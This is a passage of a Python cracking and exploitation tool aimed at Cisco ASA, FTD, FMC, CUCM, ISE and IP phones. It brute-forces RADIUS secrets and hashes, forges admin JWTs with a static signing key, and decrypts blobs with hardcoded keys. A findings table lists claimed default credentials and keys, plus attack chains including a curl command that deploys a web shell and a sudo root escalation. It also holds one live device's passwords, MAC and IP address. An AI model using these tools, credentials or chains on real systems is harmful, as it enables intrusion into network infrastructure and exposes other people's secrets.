    resp_id: int,
    resp_attrs: bytes,
    expected_resp_auth: bytes,
    words: Optional[Iterator[str]] = None,
) -> Optional[dict]:
    """
    Brute-force RADIUS shared secret from a captured packet pair (ASA-F1).

    The RADIUS Response-Authenticator is:
      MD5(Code || ID || Length || Request-Authenticator || Attrs || Secret)

    Args:
        req_auth:          16-byte Request-Authenticator from the Access-Request
        resp_code:         Response code (2 = Access-Accept)
        resp_id:           Packet ID from Access-Accept
        resp_attrs:        Raw attribute bytes from Access-Accept (after 20-byte header)
        expected_resp_auth: 16-byte Response-Authenticator from Access-Accept
        words:             Word iterator (defaults to Cisco RE wordlist)

    Returns:
        dict with 'secret' and 'source', or None if not found.
    """
    resp_length = 20 + len(resp_attrs)
    prefix = (
        struct.pack("BBH", resp_code, resp_id, resp_length)
        + req_auth
        + resp_attrs
    )
    if words is None:
        words = cisco_wordlist()
    for word in words:
        candidate = hashlib.md5(prefix + word.encode("utf-8")).digest()
        if candidate == expected_resp_auth:
            return {"secret": word, "source": "cisco_re_wordlist"}
    return None


def crack_radius_secret_from_files(req_file: str, resp_file: str,
                                    words: Optional[Iterator[str]] = None) -> Optional[dict]:
    """
    Brute-force RADIUS shared secret from raw packet binary files.
    Each file is a raw RADIUS packet (UDP payload only, no IP/UDP headers).
    """
    with open(req_file, "rb") as f:
        req_raw = f.read()
    with open(resp_file, "rb") as f:
        resp_raw = f.read()
    if len(req_raw) < 20 or len(resp_raw) < 20:
        raise ValueError("Packet file too short (expected raw RADIUS, no IP/UDP headers)")
    req_auth = req_raw[4:20]
    resp_code, resp_id, resp_length = struct.unpack("BBH", resp_raw[:4])
    resp_auth = resp_raw[4:20]
    resp_attrs = resp_raw[20:resp_length]
    return crack_radius_secret(req_auth, resp_code, resp_id, resp_attrs, resp_auth, words)


# ─────────────────────────────────────────────────────────────────────────────
# Mutation engine
# ─────────────────────────────────────────────────────────────────────────────

def _cisco_mutations(word: str) -> Iterator[str]:
    yield word
    yield word[::-1]
    yield word.lower()
    yield word.upper()
    yield word.capitalize()
    if word[-1].isalpha():
        yield word + "1"
        yield word + "!"
        yield word + "123"
        yield word + "@123"
        yield word + "2024"
        yield word + "2025"
        yield word + "2026"
    if word.lower() == word:
        yield word[0].upper() + word[1:]


def cisco_wordlist(extra_words: Optional[list] = None) -> Iterator[str]:
    """Generate Cisco RE-derived wordlist with mutations. De-duplicated."""
    seen: set = set()
    sources = _CISCO_BASE_WORDS + (extra_words or [])
    for word in sources:
        for candidate in _cisco_mutations(word):
            if candidate not in seen:
                seen.add(candidate)
                yield candidate


def cisco_wordlist_with_username(username: str) -> Iterator[str]:
    """Wordlist prioritised for known username — username=password first."""
    seen: set = set()

    def emit(w):
        if w not in seen:
            seen.add(w)
            return True
        return False

    for w in _cisco_mutations(username):
        if emit(w):
            yield w
    if emit(username[::-1]):
        yield username[::-1]
    for w in cisco_wordlist():
        if emit(w):
            yield w


# ─────────────────────────────────────────────────────────────────────────────
# Hash-specific crackers
# ─────────────────────────────────────────────────────────────────────────────

def crack_md5crypt(target: str, words: Iterator[str]) -> Optional[str]:
    parts = target.split("$")
    if len(parts) < 4:
        return None
    salt = parts[2].encode("latin-1")
    for word in words:
        if _md5crypt(word.encode("utf-8"), salt) == target:
            return word
    return None


def crack_sha_crypt(target: str, words: Iterator[str]) -> Optional[str]:
    """Crack $5$ or $6$ SHA-crypt using crypt module (fastest path on Linux)."""
    for word in words:
        if _sha_crypt_verify(word.encode("utf-8"), target):
            return word
    return None


def crack_sha256_hex(target: str, words: Iterator[str]) -> Optional[str]:
    """Crack unsalted SHA-256 hex (FTD DevAuthenticationProvider pattern)."""
    t = target.lower()
    for word in words:
        if hashlib.sha256(word.encode("utf-8")).hexdigest() == t:
            return word
    return None


def crack_sha1_hex(target: str, words: Iterator[str]) -> Optional[str]:
    """Crack unsalted SHA-1 hex (CUCM CUCMInventoryConstants pattern)."""
    t = target.lower()
    for word in words:
        if hashlib.sha1(word.encode("utf-8")).hexdigest() == t:
            return word
    return None


def crack_sha1_b64(target: str, words: Iterator[str]) -> Optional[str]:
    """Crack base64(SHA-1) — CUCM cwpass.xml pattern."""
    try:
        target_bytes = base64.b64decode(target)
    except Exception:
        return None
    for word in words:
        if hashlib.sha1(word.encode("utf-8")).digest() == target_bytes:
            return word
    return None


def crack_sha256_b64(target: str, words: Iterator[str]) -> Optional[str]:
    """Crack base64(SHA-256) — no salt."""
    try:
        target_bytes = base64.b64decode(target)
    except Exception:
        return None
    for word in words:
        if hashlib.sha256(word.encode("utf-8")).digest() == target_bytes:
            return word
    return None


def crack_ios_type8(target: str, words: Iterator[str]) -> Optional[str]:
    for word in words:
        if _type8_verify(word.encode("utf-8"), target):
            return word
    return None


def crack_ios_type9(target: str, words: Iterator[str]) -> Optional[str]:
    for word in words:
        if _type9_verify(word.encode("utf-8"), target):
            return word
    return None


# ─────────────────────────────────────────────────────────────────────────────
# Main crack dispatcher
# ─────────────────────────────────────────────────────────────────────────────

def crack(
    target: str,
    username: Optional[str] = None,
    extra_words: Optional[list] = None,
    wordlist_file: Optional[str] = None,
    verbose: bool = False,
) -> Optional[dict]:
    """
    Crack or decode a Cisco hash/ciphertext.

    Returns dict(plaintext, type, method, source) or None.
    """
    target = target.strip()

    # Pre-verified fast-path
    if target in KNOWN_HASHES:
        info = KNOWN_HASHES[target]
        return {
            "plaintext": info["plaintext"],
            "type": "known",
            "method": "pre-verified (ablation)",
            "source": info.get("source", ""),
        }

    hash_type = detect_hash_type(target)
    if verbose:
        print(f"[*] hash type: {hash_type}", file=sys.stderr)

    if hash_type == "ios_type7":
        plain = type7_decode(target)
        return {"plaintext": plain, "type": "ios_type7", "method": "vigenere_decode", "source": ""} if plain else None

    # Build wordlist
    if wordlist_file:
        def _file_words():
            with open(wordlist_file) as f:
                for line in f:
                    yield line.rstrip("\n")
        words = _file_words()
    elif username:
        words = cisco_wordlist_with_username(username)
    else:
        words = cisco_wordlist(extra_words=extra_words)

    dispatch = {
        "md5crypt":    crack_md5crypt,
        "sha256crypt": crack_sha_crypt,
        "sha512crypt": crack_sha_crypt,
        "sha256_hex":  crack_sha256_hex,
        "sha1_hex":    crack_sha1_hex,
        "sha1_b64":    crack_sha1_b64,
        "sha256_b64":  crack_sha256_b64,
        "ios_type8":   crack_ios_type8,
        "ios_type9":   crack_ios_type9,
    }

    fn = dispatch.get(hash_type)
    if fn is None:
        return None
    plaintext = fn(target, words)
    if plaintext is None:
        return None
    return {
        "plaintext": plaintext,
        "type": hash_type,
        "method": "cisco_re_wordlist",
        "source": f"username={username}" if username else "",
    }


# ─────────────────────────────────────────────────────────────────────────────
# Ablation findings reference
# ─────────────────────────────────────────────────────────────────────────────

ABLATION_FINDINGS = {
    "PHN-F15": {
        "finding": "Cisco 78xx/8845-65 UC debug account — static MD5crypt credential",
        "hash":    "$1$aoJQnypw$vHpN9WTJEQn1UnHzJdoz71",
        "plaintext": "debug",
        "username":  "debug",
        "shell":     "/usr/sbin/debugsh",
        "firmware":  ["78xx 12.5.1SR1-4 P1/P2", "78xx 12.8.1 r1/r2", "8845-65 12.8.1"],
        "chain":     "TFTP sshAccess=1 -> SSH debug:debug -> debugsh shell",
    },
    "PHN-F17": {
        "finding": "TFTP SEP<MAC>.cnf.xml cleartext credential disclosure (unauthenticated UDP/69)",
        "live_example": {
            "model": "7942G", "mac": "B8:BE:BF:22:C2:53",
            "sshPassword": "foojansun",
            "ext_102_authPassword": "8dffrffr54",
            "ext_103_authPassword": "fd34rvf",
            "pbx_ip": "172.16.1.15", "pbx_sw": "ISSABEL",
        },
        "plaintext": "cleartext — no cracking required",
    },
    "CUCM-F3": {
        "finding": "CUCM CCMEncryption static AES-128-CBC fallback key",
        "key_hex":   "736d65747379736f63736963636e6900",
        "key_ascii": "smetsysocsiccni\\x00",
        "key_reversed": "incciscosystems",
        "usage": "use cucm_aes_decrypt(b64_blob) — wire format: IV(16)||AES-128-CBC-PKCS5(ct)",
    },
    "CUCM-F116": {
        "finding": "CUCM DRF AES-GCM all-zero IV — offline DRF credential decryption",
        "iv":  "00" * 16,
        "salt": "0102030405060708090a0b0c0d0e0f10",
        "usage": "use drf_aes_gcm_decrypt(b64_blob, passphrase) with passphrase from platformConfig.xml",
    },
    "CUCM-F403": {
        "finding": "Hardcoded SHA-1 ccmadmin credential in CUCMInventoryConstants.class",
        "sha1_hex": "79c11ee954d97f66ff425e73b6c94203bbbaddac",
        "plaintext": "ccmadmin",
    },
    "F-FTD-79": {
        "finding": "FDM DevAuthenticationProvider hardcoded SHA-256 hashes (factory-fresh FTD only)",
        "credentials": {
            "admin":  [("Admin123",  "3b612c75..."), ("Sourcefire", "87285c98..."), ("Admin123$", "22b7dec7...")],
            "reader": [("Reader123", "67f990ab..."), ("Reader123$", "38fd6664...")],
            "writer": [("Writer123", "fb02892b..."), ("Writer123$", "42e7974d...")],
        },
        "scope": "Only on unconfigured FTD (no DB password set); reader/writer only in dev Spring profile",
        "usage": "crack() auto-resolves all 7 hashes from KNOWN_HASHES fast-path",
    },
    "F-FTD-59": {
        "finding": "FTD sfmb (SF Message Broker) static credentials",
        "username": "mbuser",
        "password": "snortrules",
        "source":   "/etc/sf/ims-data.conf SF_AUTH_NAME / SF_AUTH_PW",
        "socket":   "/var/sf/peers/<peer>/sfmb.sox",
    },
    "F-FTD-77": {
        "finding": "FTD MySQL hardcoded credentials in /etc/sf/dbaccess.conf.in",
        "credentials": {
            "barnyard:barnyard":       "sfsnort DB (Snort alert storage)",
            "correlator:correlator":   "correlator DB (event correlation)",
        },
    },
    "F-FTD-82": {
        "finding": "FTD RabbitMQ static bonfire-app credentials",
        "username": "bonfire-app",
        "password": "password",
        "vhost":    "/bonfire",
        "source":   "/etc/rabbitmq/rabbitmq.config (generated from rabbitmq.config.tt)",
    },
    "F-FTD-110 / Vuln-3": {
        "finding": "FTD/FMC encryption_util.py hardcoded AES-256-CBC passphrase",
        "passphrase": "r4onxh8364&Jh^%P)Kqf65d6ev#^%#(&(;kuwtUTR-WQp%^#86",
        "key_hex":    FTD_AES256_KEY.hex(),
        "source":     "/ngfw/cisco/sf_common_base/util/encryption_util.py (Copyright 2011-2013)",
        "scope":      "ALL FTD and FMC installations worldwide; unchanged since 2011",
        "usage":      "use ftd_aes256_decrypt(b64_blob); wire: IV(16)||AES-256-CBC-PKCS5(ct)",
    },
    "Vuln-2": {
        "finding": "FDM JWT static HMAC-SHA256 signing key — arbitrary role forgery",
        "key_hex":  FTD_JWT_KEY_HEX,
        "key_b64":  FTD_JWT_KEY_B64,
        "key_uuid": "6adc7474-37f8-482b-a9d2-8e0e34d1628a",
        "source":   "/ngfw/var/lib/db/ngfw.db/neostore.propertystore.db.strings (-rw-r--r-- www)",
        "usage":    "use forge_fdm_jwt(role='ROLE_ADMIN') — verified: server reads userRole from token",
    },
    "Vuln-5": {
        "finding": "FTD admin Linux shadow hash — NOPASSWD cli_shadow extraction + offline crack",
        "hash":    "$6$EW6Lr2TLvDLZ/VLr$DfPAZvf4JieBs0TyE19JIBeMQJU3txXmPrvekVqq9LIu9BgCOCk8SvZ5vZzKsqLQdNNsJX9j0ptIzb7oWRQGE1",
        "plaintext": "cisco123",
        "crack_time": "<1 second (rockyou.txt)",
        "root_chain": "printf 'cisco123\\n' | sudo -S id -> uid=0(root)",
        "extraction": "sudo -n /usr/local/sf/bin/cli_shadow -u admin",
    },
    "Vuln-6": {
        "finding": "FDM admin application password decrypt via world-readable Neo4j AES-128-CTR key",
        "key_b64": FTD_JWT_KEY_B64,
        "key_source": "Neo4j SerializationKey node, same file as Vuln-2",
        "usage":   "use ftd_neo4j_decrypt(b64_encrypted_pw) — wire: IV(16)||AES-128-CTR(ct)",
        "note":    "Distinct from Vuln-5: recovers FDM API credential, not Linux password",
    },
    "ASA-F1": {
        "finding": "ASA RADIUS Class attribute group policy injection — missing Message-Authenticator validation",
        "binary_versions": {
            "9.22.2.32": "88929a4c3f35a2c0786e01e63c2e64626666ef23",
            "9.14.2.14": "65cd0306770da18bb71c057dc0dd1472391a1569",
        },
        "key_addresses": {
            "0x03a4bda0": "Class attr parse+log (OU= extraction)",
            "0x03a4bee6": "strstr('OU=') call site",
            "0x03a4bfa4": "extraction loop bound (CMP rax, 0x100 = 256 bytes)",
            "0x01a30894": "strncpy(gp_obj+0x2b1, attr_val, max_len)",
        },
        "response_auth": "MD5(Code||ID||Length||Request-Authenticator||Attrs||Secret)",
        "mitigation":    "9.22.x adds message-authenticator-required sub-command (DISABLED BY DEFAULT)",
        "usage":         "use crack_radius_secret() or crack_radius_secret_from_files()",
    },
    "FMC-Vuln-4": {
        "finding": "FMC SymmetricDS hardcoded database credentials (upgrade package, public)",
        "credentials": {
            "Sybase vms dba": "dmkebdpq",
            "MySQL cfgdb root": "IlahU)[h08Ug}jdX:)5zoZx[2971*{Qv@4]wVk]/",
        },
        "source": "syb-000.properties + mdb-001.properties (FMC upgrade package, no auth to extract)",
        "scope": "All FMC 10.0.1-1 installations",
    },
    "FMC-Vuln-5": {
        "finding": "FMC dbaccess.conf.in world-readable hardcoded credential store (8 services)",
        "credentials": {
            "root:admin":          "MySQL root (independent of Vuln-4)",
            "interface:interface": "MySQL interface service",
            "barnyard:barnyard":   "MySQL sfsnort (Snort alerts)",
            "correlator:correlator": "MySQL event correlator",
            "external:external":   "MySQL external",
            "cfguser:cfguser":     "MySQL cfgdb config user",
            "monetdb:monetdb123":  "MonetDB monetdb",
            "eventdb_user:eventdb123": "MonetDB event database",
        },
        "file": "/etc/sf/dbaccess.conf.in -> /etc/sf/dbaccess.conf (chmod 0o644, world-readable)",
        "bypass": "touch /etc/sf/dbaccess.random.disable -> skips randomization on all reboots",
    },
    "FMC-Vuln-6": {
        "finding": "FMC RabbitMQ definitions.json — six hardcoded passwords including administrator",
        "credentials": {
            "bonfire-manager:password": "RabbitMQ administrator tag — full management API :15672",
            "bonfire-app:password":     "application",
            "correlator-app:password":  "correlator",
            "FMC:password":             "FMC core",
            "LL:":                      "empty password — no authentication required",
            "ll-local-user:ll-local-user": "username=password",
        },
        "source": "/etc/rabbitmq/definitions.json, loaded at broker startup",
    },
    "FMC-Vuln-30": {
        "finding": "FMC IOS Backend device template hardcoded admin:cisco credential",
        "username": "admin",
        "password": "cisco",
        "scope": "IOS device push template, affects managed FTD/ASA devices receiving config",
    },
    "ISE-Vuln-1": {
        "finding": "ISE PSP-Commons 3DES static Oracle credential encryption key (CVSS 9.1 Critical)",
        "key_raw":  "ASDF asdf 1234 8983 jkla",
        "key_bytes": ISE_3DES_KEY.hex(),
        "algorithm": "DESede/ECB/PKCS5Padding",
        "class": "DefaultCryptEncryptor, com.cisco.epm.auth.encryptor.crypt",
        "usage":    "use ise_3des_decrypt(b64_ciphertext); all four pre-verified in KNOWN_HASHES fast-path",
        "decrypted_creds": {
            "pTZv2LEjfGPX5YICzJb95g==": "U0l1_6v#k3c (Oracle cepm/mnt/strmadmin/sys/system)",
            "1GOnYUy8rmREq6iEZjvEnQ==": "mohammal (PAP handler)",
            "h1BYu+lcwcM=":             "admin (XACML superuser)",
            "fG5w7wguLks=":             "psctest (dev DB link, residue)",
        },
        "chain": "Offline decrypt -> sqlplus system/'U0l1_6v#k3c'@ISE:1521/cpm10 as sysdba",
    },
    "ISE-Vuln-4": {
        "finding": "ISE Main Tomcat empty-password account with manager-script role (CVSS 10.0)",
        "username": "user",
        "password": "",
        "port": 8080,
        "chain": "curl -u 'user:' http://ISE:8080/manager/text/deploy?path=/shell -T shell.war",
    },
    "ISE-Vuln-5": {
        "finding": "ISE CA Tomcat hardcoded manager:password credential on plain HTTP (CVSS 10.0)",
        "username": "manager",
        "password": "password",
        "port": 9444,
        "transport": "plain HTTP (TLS connector commented out in server.xml)",
        "chain": "WAR deploy to CA Tomcat -> code exec in CA service context -> full PKI compromise",
    },
    "ISE-Add-2": {
        "finding": "ISE IRF RabbitMQ hardcoded irf:irf administrator credential",
        "username": "irf",
        "password": "irf",
        "role": "administrator",
    },
    "ASA-F2": {
        "finding": "ASA RADIUS OU= buffer overflow — gp_obj+0x2b1 char[32] overflowed to pointer fields",
        "overflow_thresholds": {
            "+33 bytes": "gp_obj+0x2d1 (default-domain/split-dns)",
            "+96 bytes": "gp_obj+0x308 wins-server primary PTR",
            "+256 bytes": "full gp_obj corruption (extraction cap)",
        },
        "status": "Runtime verification in progress on authorized test environment",
    },
}


# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────

def _print_findings():
    print("\n=== Ablation-Confirmed Cisco Credentials & Keys ===\n")
    for fid, data in ABLATION_FINDINGS.items():
        print(f"  [{fid}] {data['finding']}")
        for key in ("plaintext", "password", "key_hex", "key_b64", "passphrase", "hash"):
            if val := data.get(key):
                print(f"         {key}: {val}")
        print()


def main():
    import argparse

    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("target", nargs="?",
                   help="Hash, Type 7 ciphertext, or base64 blob")
    p.add_argument("--username", help="Known username — enables username=password fast-path")
    p.add_argument("--wordlist", help="Additional wordlist file (one word per line)")
    p.add_argument("--detect", action="store_true", help="Detect hash type only, no cracking")
    p.add_argument("--findings", action="store_true",
                   help="Print all ablation-confirmed credentials and keys")

    # Decrypt modes
    p.add_argument("--cucm-aes", metavar="B64",
                   help="Decrypt CUCM AES-128-CBC blob (static key smetsysocsiccni\\x00)")
    p.add_argument("--cucm-key", help="Override CUCM AES key (hex)")
    p.add_argument("--ftd-aes", metavar="B64",
                   help="Decrypt FTD AES-256-CBC blob (static passphrase key, Vuln-3)")
    p.add_argument("--ftd-neo4j", metavar="B64",
                   help="Decrypt FDM admin password via Neo4j AES-128-CTR key (Vuln-6)")
    p.add_argument("--ftd-jwt-key", metavar="HEX",
                   help=f"Override FDM JWT/Neo4j key (hex; default: {FTD_JWT_KEY_HEX})")
    p.add_argument("--drf-aes", metavar="B64",
                   help="Decrypt CUCM DRF AES-GCM blob (zero-IV, CUCM-F116)")
    p.add_argument("--drf-pass", help="DRF passphrase from platformConfig.xml")
    p.add_argument("--ise-3des", metavar="B64",
                   help="Decrypt ISE DefaultCryptEncryptor 3DES-ECB blob (ISE-Vuln-1)")

    # Active exploitation helpers
    p.add_argument("--forge-jwt", action="store_true",
                   help="Forge FDM JWT with static signing key (Vuln-2)")
    p.add_argument("--role", default="ROLE_ADMIN",
                   choices=["ROLE_ADMIN", "ROLE_USER"],
                   help="JWT userRole claim for --forge-jwt (default: ROLE_ADMIN)")
    p.add_argument("--original-token", metavar="JWT",
                   help="Modify this existing token's claims (preserves JTI for Vuln-2)")

    # RADIUS brute-force
    p.add_argument("--radius-secret", action="store_true",
                   help="Brute-force RADIUS shared secret from captured packet pair (ASA-F1)")
    p.add_argument("--req", metavar="FILE",
                   help="[--radius-secret] Raw Access-Request packet binary file")
    p.add_argument("--resp", metavar="FILE",
                   help="[--radius-secret] Raw Access-Accept packet binary file")
    p.add_argument("--req-auth", metavar="HEX16",
                   help="[--radius-secret] Request-Authenticator (32 hex chars) if not using --req")
    p.add_argument("--resp-auth", metavar="HEX16",
                   help="[--radius-secret] Response-Authenticator from Access-Accept")
    p.add_argument("--resp-code", type=int, default=2,
                   help="[--radius-secret] RADIUS response code (default 2 = Access-Accept)")
    p.add_argument("--resp-id", type=int, default=1,
                   help="[--radius-secret] RADIUS packet ID from Access-Accept")
    p.add_argument("--resp-attrs", metavar="HEX",
                   help="[--radius-secret] Raw attribute bytes from Access-Accept (hex)")

    args = p.parse_args()

    if args.findings:
        _print_findings()
        return

    if args.cucm_aes:
        key = bytes.fromhex(args.cucm_key) if args.cucm_key else CUCM_STATIC_KEY
        plain = cucm_aes_decrypt(args.cucm_aes, key=key)
        print(f"DECRYPTED: {plain}" if plain else "FAILED")
        return

    if args.ftd_aes:
        plain = ftd_aes256_decrypt(args.ftd_aes)
        print(f"DECRYPTED: {plain}" if plain else "FAILED")
        return

    if args.ftd_neo4j:
        key_b64 = base64.b64encode(bytes.fromhex(args.ftd_jwt_key)).decode() if args.ftd_jwt_key else FTD_JWT_KEY_B64
        plain = ftd_neo4j_decrypt(args.ftd_neo4j, key_b64=key_b64)
        print(f"DECRYPTED: {plain}" if plain else "FAILED")
        return

    if args.drf_aes:
        if not args.drf_pass:
            p.error("--drf-pass required for DRF decryption")
        plain = drf_aes_gcm_decrypt(args.drf_aes, args.drf_pass)
        print(f"DECRYPTED: {plain}" if plain else "FAILED")
        return

    if args.ise_3des:
        plain = ise_3des_decrypt(args.ise_3des)
        if plain:
            print(f"DECRYPTED: {plain}")
            if args.ise_3des in KNOWN_HASHES:
                print(f"  source: {KNOWN_HASHES[args.ise_3des].get('source', '')}")
        else:
            print("FAILED")
        return

    if args.forge_jwt:
        key = bytes.fromhex(args.ftd_jwt_key) if args.ftd_jwt_key else FTD_JWT_KEY
        token = forge_fdm_jwt(role=args.role, original_token=args.original_token, key=key)
        print(f"FORGED JWT ({args.role}):")
        print(token)
        print(f"\nUsage: curl -H 'Authorization: Bearer {token[:40]}...' "
              f"https://<ftd>/api/fdm/v6/object/users")
        return

    if args.radius_secret:
        extra = []
        if args.wordlist:
            with open(args.wordlist) as f:
                extra = [line.rstrip("\n") for line in f]
        words = cisco_wordlist(extra_words=extra)

        if args.req and args.resp:
            result = crack_radius_secret_from_files(args.req, args.resp, words)
        elif args.req_auth and args.resp_auth and args.resp_attrs is not None:
            req_auth = bytes.fromhex(args.req_auth)
            resp_auth = bytes.fromhex(args.resp_auth)
            resp_attrs = bytes.fromhex(args.resp_attrs) if args.resp_attrs else b""
            result = crack_radius_secret(req_auth, args.resp_code, args.resp_id,
                                          resp_attrs, resp_auth, words)
        else:
            p.error("--radius-secret requires either --req + --resp, or "
                    "--req-auth + --resp-auth + --resp-id + --resp-attrs")
            return

        if result:
            print(f"\nCRACKED RADIUS SECRET: {result['secret']}")
            print(f"  source: {result['source']}")
            print(f"\nASA-F1 chain: inject OU=<policy>; in Access-Accept Class attr — no MA required")
        else:
            print("NOT FOUND in Cisco RE wordlist")
            sys.exit(2)
        return

    if not args.target:
        p.print_help()
        sys.exit(1)

    if args.detect:
        print(detect_hash_type(args.target))
        return

    extra = []
    if args.wordlist:
        with open(args.wordlist) as f:
            extra = [line.rstrip("\n") for line in f]

    result = crack(args.target, username=args.username, extra_words=extra, verbose=True)
    if result:
        print(f"\nCRACKED: {result['plaintext']}")
        print(f"  type:   {result['type']}")
        print(f"  method: {result['method']}")
        if result.get("source"):
            print(f"  source: {result['source']}")
    else:
        print("NOT FOUND in Cisco RE wordlist")
        sys.exit(2)


if __name__ == "__main__":
    main()
